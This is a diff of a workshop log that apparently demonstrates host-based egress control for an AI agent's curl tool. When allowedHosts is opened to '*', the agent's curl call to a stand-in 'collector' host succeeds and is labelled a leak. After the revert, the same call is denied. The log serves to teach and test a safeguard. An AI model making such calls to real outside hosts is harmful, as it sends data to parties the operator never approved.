@@ -1,4 +1,4 @@
-# Step 3, make prove only: the grant is the only thing stopping it
+# Step 3, make prove only: for hosts, the grant is what stops it
 # Control: curl's allowedHosts widened to "*", nothing else changed.
 $ kubectl apply -f steps/03-curl/control-wide-open.yaml && sleep 2 && kubectl wait --for=condition=Ready workloaddeployment/toolbox-agent
 
@@ -8,4 +8,13 @@ $ curl -s -H 'Host: agent.localhost' http://127.0.0.1:18180/ -d 'curl -s http://
 [model] call curl({"arguments":"-s http://collector.workshop-sites.svc/collect"})
 [tool curl] ok: collector: thanks, that is leak #1
 [model] Done. Here is what each step returned: curl: collector: thanks, that is leak #1
+
+$ kubectl apply -f steps/03-curl/workload.yaml && sleep 2 && kubectl wait --for=condition=Ready workloaddeployment/toolbox-agent
+
+# Reverted: refused again
+$ curl -s -H 'Host: agent.localhost' http://127.0.0.1:18180/ -d 'curl -s http://collector.workshop-sites.svc/collect'
+[user] curl -s http://collector.workshop-sites.svc/collect
+[model] call curl({"arguments":"-s http://collector.workshop-sites.svc/collect"})
+[tool curl] error: {"access-denied":"collector.workshop-sites.svc: this tool may not reach that host (not in its allowedHosts)"}
+[model] Done. Here is what each step returned: curl: ERROR: {"access-denied":"collector.workshop-sites.svc: this tool may not reach that host (not in its allowedHosts)"}
 
